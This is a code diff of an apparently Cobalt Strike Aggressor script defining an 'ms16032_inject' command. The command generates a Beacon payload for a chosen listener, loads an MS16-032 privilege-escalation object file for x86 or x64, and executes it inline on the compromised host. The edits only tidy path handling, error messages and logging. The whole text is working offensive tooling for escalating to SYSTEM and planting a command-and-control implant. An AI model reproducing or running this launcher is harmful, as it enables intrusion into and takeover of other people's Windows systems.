@@ -1,6 +1,6 @@
 # MS16-032 BOF — Direct Beacon Injection
 alias ms16032_inject {
-    local('$barch $handle $data $args $listener $payload');
+    local('$barch $handle $data $args $listener $payload $bofName $bofPath');
 
     if (size(@_) < 2) {
         berror($1, "Usage: ms16032_inject <listener>");
@@ -14,17 +14,27 @@ alias ms16032_inject {
     $payload = payload($listener, $barch, "thread");
 
     if (strlen($payload) == 0) {
-        berror($1, "Failed to generate payload — verify listener name: $listener");
+        berror($1, "Failed to generate payload — verify listener name: " . $listener);
         return;
     }
 
-    blog($1, "Generated $barch payload (" . strlen($payload) . " bytes) for listener: $listener");
+    blog($1, "Generated " . $barch . " payload (" . strlen($payload) . " bytes) for listener: " . $listener);
 
-    # Load architecture-matched BOF
-    $handle = openf(script_resource("ms16032_inject." . $barch . ".o"));
+    # Build BOF filename and resolve path
+    if ($barch eq "x64") {
+        $bofName = "ms16032_inject.x64.o";
+    }
+    else {
+        $bofName = "ms16032_inject.x86.o";
+    }
+
+    $bofPath = script_resource($bofName);
+    blog($1, "Loading BOF: " . $bofPath);
+
+    $handle = openf($bofPath);
 
     if ($handle is $null) {
-        berror($1, "Cannot open ms16032_inject." . $barch . ".o — compile for $barch first");
+        berror($1, "Cannot open " . $bofName . " — compile for " . $barch . " first");
         return;
     }
 
@@ -32,13 +42,16 @@ alias ms16032_inject {
     closef($handle);
 
     if (strlen($data) == 0) {
-        berror($1, "BOF file is empty");
+        berror($1, "BOF file is empty or not found at: " . $bofPath);
+        berror($1, "Ensure the compiled .o file is in the same directory as this .cna script");
         return;
     }
 
+    blog($1, "Loaded " . strlen($data) . " bytes from " . $bofName);
+
     $args = bof_pack($1, "b", $payload);
 
-    btask($1, "MS16-032 LPE -> $listener \(" . $barch . "\)");
+    btask($1, "Executing MS16-032 LPE -> " . $listener . " [" . $barch . "]");
     beacon_inline_execute($1, $data, "go", $args);
 }
 
